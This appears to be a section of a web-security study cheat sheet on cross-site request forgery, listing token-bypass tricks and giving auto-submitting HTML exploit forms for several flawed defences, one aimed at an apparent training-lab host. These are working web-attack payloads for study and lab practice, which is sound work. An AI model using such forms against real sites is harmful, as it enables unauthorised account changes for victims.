# 21. CSRF (Cross-Site Request Forgery)

## CSRF bypass techniques

- No CSRF token validation
- Weak / predictable CSRF token
- `Content-Type` not enforced
- `Referer` header not validated
- HTTP method swap (GET ↔ POST)

## CSRF token bypass tricks

- Remove the anti-CSRF token
- Token not bound to the user
- Weak token
- Reusable token
- Method swap
- Guessable token
- Referer bypass

## Common attack patterns

- Remove the `Referer` header and replay the request — see if the response succeeds.
- Strip "important" headers and replay the request — see if the response succeeds.
- Remove the CSRF token and replay the request — see if the response succeeds.

## Vanilla CSRF (no defence at all)

Vulnerable request:

```
POST /myaccount/changeemail
Host: ...

email=...
```

Exploit:

```html
<form action="" method="POST">
   <input type="hidden" name="email" value="">
</form>
<script>
   document.forms[0].submit();
</script>
```

## CSRF where the server only checks that a token *exists*

Vulnerable request:

```
POST /myaccount/changeemail
Host: ...

email=...&csrftoken=...
```

> Tip: simply remove the `csrftoken` parameter from the exploit form.

```html
<form action="" method="POST">
   <input type="hidden" name="email" value="">
</form>
<script>
   document.forms[0].submit();
</script>
```

## CSRF where token validation depends on the HTTP method

Vulnerable request:

```
POST /myaccount/changeemail
Host: ...

email=...&csrftoken=...
```

> Tips: remove the CSRF token, switch the method to `GET`.

```html
<form action="" method="GET">
   <input type="hidden" name="email" value="">
</form>
<script>
   document.forms[0].submit();
</script>
```

## CSRF where the token is not bound to the user's session

Steps:

1. Create two accounts.
2. Log into the first account and change the email — capture the request, copy the CSRF token, then drop the request.
3. Log into the second account in another browser, intercept its email-change request, replace the CSRF token with the one you took from the first account, and send it. If the email change succeeds, the token is not bound to the session — exploitable.

## CSRF via method override

```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="">
   </form>
   <script>
      document.forms[0].submit();
   </script>
</body>
</html>
```

## CSRF where the token is mirrored from a cookie

```html
<html>
<body>
   <script>history.pushState(' ',' ','/')</script>
   <form action="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/my-account/change-email" method="POST"/>
      <input type="hidden" name="email" value="a@gmail.com"/>
      <input type="hidden" name="csrf" value="fake"/>
      <input type="submit" value="submit request"/>
   </form>
```
